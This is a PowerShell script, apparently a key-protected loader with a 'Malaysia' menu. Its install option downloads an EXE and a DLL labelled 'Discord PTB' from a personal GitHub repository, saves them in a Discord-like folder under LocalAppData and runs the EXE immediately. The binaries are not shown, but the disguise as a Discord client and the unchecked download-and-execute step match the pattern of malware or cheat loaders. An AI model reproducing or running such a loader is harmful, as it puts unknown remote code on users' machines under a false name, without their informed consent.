$CorrectKey = "SMITHSHOP"

$ExeUrl = "https://raw.githubusercontent.com/draft7973-ops/Smithshop/refs/heads/main/Discord%20PTB.exe"
$DllUrl = "https://raw.githubusercontent.com/draft7973-ops/Smithshop/refs/heads/main/Discord%20PTB.dll"

$BasePath = "$env:LOCALAPPDATA\DiscordPTB"
$ExePath = "$BasePath\DiscordPTB.exe"
$DllPath = "$BasePath\DiscordPTB.dll"

Clear-Host
Write-Host "============================="
Write-Host "        Malaysia :]"
Write-Host "============================="
$key = Read-Host "Enter Key"

if ($key -ne $CorrectKey) {
    Write-Host "Wrong key!" -ForegroundColor Red
    Start-Sleep 2
    exit
}

while ($true) {
    Clear-Host
    Write-Host "============================="
    Write-Host "       Malaysia Di waa"
    Write-Host "============================="
    Write-Host "1. Install"
    Write-Host "2. Check"
    Write-Host "0. Exit"

    $choice = Read-Host "Select"

    if ($choice -eq "1") {
        Clear-Host
        Write-Host "Installing..."

        try {
            if (!(Test-Path $BasePath)) {
                New-Item -ItemType Directory -Path $BasePath -Force | Out-Null
            }

            # โหลดไฟล์
            Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing
            Invoke-WebRequest -Uri $DllUrl -OutFile $DllPath -UseBasicParsing

            Write-Host "Install complete!" -ForegroundColor Green

            # ✅ รันทันที
            Start-Process -FilePath $ExePath -WorkingDirectory $BasePath
        }
        catch {
            Write-Host "Install failed!" -ForegroundColor Red
        }

        pause
    }
    elseif ($choice -eq "2") {
        Clear-Host

        if (Test-Path $ExePath) {
            Write-Host "EXE found" -ForegroundColor Green
        } else {
            Write-Host "EXE not found" -ForegroundColor Yellow
        }

        if (Test-Path $DllPath) {
            Write-Host "DLL found" -ForegroundColor Green
        } else {
            Write-Host "DLL not found" -ForegroundColor Yellow
        }

        pause
    }
    elseif ($choice -eq "0") {
        exit
    }
}
